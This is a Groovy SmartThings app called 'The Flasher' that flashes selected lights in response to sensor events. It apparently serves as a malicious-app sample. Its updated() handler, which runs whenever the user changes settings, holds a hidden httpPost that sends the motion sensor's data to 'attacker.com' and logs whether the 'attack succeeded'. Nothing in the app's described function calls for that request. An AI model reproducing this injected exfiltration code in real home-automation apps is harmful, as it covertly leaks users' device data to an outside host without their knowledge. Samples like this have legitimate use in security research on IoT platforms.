
definition(
    name:"The Flasher",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Flashes a set of lights in response to motion,an open/close event,or a switch.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet-contact.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet-contact@2 x.png"
)

preferences{
    section("When any of the following devices trigger..."){
        input"motion","capability.motionSensor",title:"Motion Sensor?",required:false
        input"contact","capability.contactSensor",title:"Contact Sensor?",required:false
        input"acceleration","capability.accelerationSensor",title:"Acceleration Sensor?",required:false
        input"mySwitch","capability.switch",title:"Switch?",required:false
        input"myPresence","capability.presenceSensor",title:"Presence Sensor?",required:false
        }
    section("Then flash..."){
        input"switches","capability.switch",title:"These lights",multiple:true
        input"numFlashes","number",title:"This number of times(default 3)",required:false
        }
    section("Time settings in milliseconds(optional)..."){
        input"onFor","number",title:"On for(default 1000)",required:false
        input"offFor","number",title:"Off for(default 1000)",required:false
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    
    subscribe()
}

def updated(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"hi"
    ]
    ]
    takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${motion}"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    subscribe()
}

def subscribe(){
    if(contact){
        subscribe(contact,"contact.open",contactOpenHandler)
    }
    if(acceleration){
        subscribe(acceleration,"acceleration.active",accelerationActiveHandler)
    }
    if(motion){
        subscribe(motion,"motion.active",motionActiveHandler)
    }
    if(mySwitch){
        subscribe(mySwitch,"switch.on",switchOnHandler)
    }
    if(myPresence){
        subscribe(myPresence,"presence",presenceHandler)
    }
}

def motionActiveHandler(evt){
    log.debug"motion$evt.value"
    flashLights()
}

def contactOpenHandler(evt){
    log.debug"contact$evt.value"
    flashLights()
}

def accelerationActiveHandler(evt){
    log.debug"acceleration$evt.value"
    flashLights()
}

def switchOnHandler(evt){
    log.debug"switch$evt.value"
    flashLights()
}

def presenceHandler(evt){
    log.debug"presence$evt.value"
    if(evt.value=="present"){
        flashLights()
    }else if(evt.value=="not present"){
            flashLights()
        }
}

private flashLights(){
    def doFlash=true
    def onFor=onFor?:1000
    def offFor=offFor?:1000
    def numFlashes=numFlashes?:3
    
    log.debug"LAST ACTIVATED IS:${state.lastActivated}"
    if(state.lastActivated){
        def elapsed=now()-state.lastActivated
        def sequenceTime=(numFlashes+1)*(onFor+offFor)
        doFlash=elapsed>sequenceTime
        log.debug"DO FLASH:$doFlash,ELAPSED:$elapsed,LAST ACTIVATED:${state.lastActivated}"
    }
    
    if(doFlash){
        log.debug"FLASHING$numFlashes times"
        state.lastActivated=now()
        log.debug"LAST ACTIVATED SET TO:${state.lastActivated}"
        def initialActionOn=switches.collect{it.currentSwitch!="on"}
        def delay=0L
        numFlashes.times{
            log.trace"Switch on after$delay msec"
            switches.eachWithIndex{s,i->
                if(initialActionOn[i]){
                    s.on(delay:delay)
                }
                else{
                        s.off(delay:delay)
                    }
                }
            delay+=onFor
            log.trace"Switch off after$delay msec"
            switches.eachWithIndex{s,i->
                if(initialActionOn[i]){
                    s.off(delay:delay)
                }
                else{
                        s.on(delay:delay)
                    }
                }
            delay+=offFor
            }
    }
}


